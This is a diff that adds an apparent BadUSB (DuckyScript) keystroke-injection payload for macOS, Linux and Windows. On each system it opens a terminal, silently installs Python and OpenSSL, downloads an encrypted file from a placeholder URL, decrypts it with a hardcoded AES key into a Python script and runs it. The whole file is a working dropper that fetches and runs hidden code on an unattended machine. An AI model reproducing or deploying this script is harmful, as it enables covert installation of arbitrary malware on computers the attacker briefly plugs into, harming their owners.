@@ -1,0 +1,91 @@
+DELAY 500
+
+REM --- Try to open Terminal on macOS/Linux ---
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1500
+
+REM Check if Terminal opened (if successful, execute macOS/Linux commands)
+STRING clear
+ENTER
+DELAY 500
+
+REM --- Check and install Python and OpenSSL on macOS/Linux ---
+STRING if ! command -v python3 &> /dev/null; then brew install python3; fi
+ENTER
+DELAY 3000
+
+STRING if ! command -v openssl &> /dev/null; then brew install openssl; fi
+ENTER
+DELAY 3000
+
+REM Curls the URL and saves the BIN output
+STRING curl -o main_enc.bin <Your_URL_Here>
+ENTER
+DELAY 2000
+
+REM Decrypts the BIN file using openssl
+STRING openssl enc -aes-256-cbc -d -in main_enc.bin -out main_dec.py -k C88F834A5933FA663166B62616E16
+ENTER
+DELAY 1000
+
+REM Runs the Python script
+STRING python3 main_dec.py
+ENTER
+DELAY 2000
+
+REM Closes Terminal
+STRING exit
+ENTER
+DELAY 500
+
+REM --- Try to open Command Prompt on Windows ---
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+
+REM --- Download and install Python and OpenSSL on Windows ---
+
+REM Download Python installer
+STRING curl -o python-installer.exe https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe
+ENTER
+DELAY 2000
+
+REM Run Python installer silently (silent install)
+STRING python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
+ENTER
+DELAY 5000
+
+REM Download OpenSSL installer (Windows)
+STRING curl -o openssl-installer.exe https://slproweb.com/download/Win64OpenSSL_Light-3_0_7.exe
+ENTER
+DELAY 2000
+
+REM Run OpenSSL installer silently
+STRING openssl-installer.exe /silent
+ENTER
+DELAY 5000
+
+REM Curls the URL and saves the BIN output (Windows)
+STRING curl -o main_enc.bin <Your_URL_Here>
+ENTER
+DELAY 2000
+
+REM Decrypts the BIN file using openssl (Windows)
+STRING openssl enc -aes-256-cbc -d -in main_enc.bin -out main_dec.py -k C88F834A5933FA663166B62616E16
+ENTER
+DELAY 1000
+
+REM Runs the Python script (Windows)
+STRING python main_dec.py
+ENTER
+DELAY 2000
+
+REM Closes the Command Prompt
+STRING exit
+ENTER
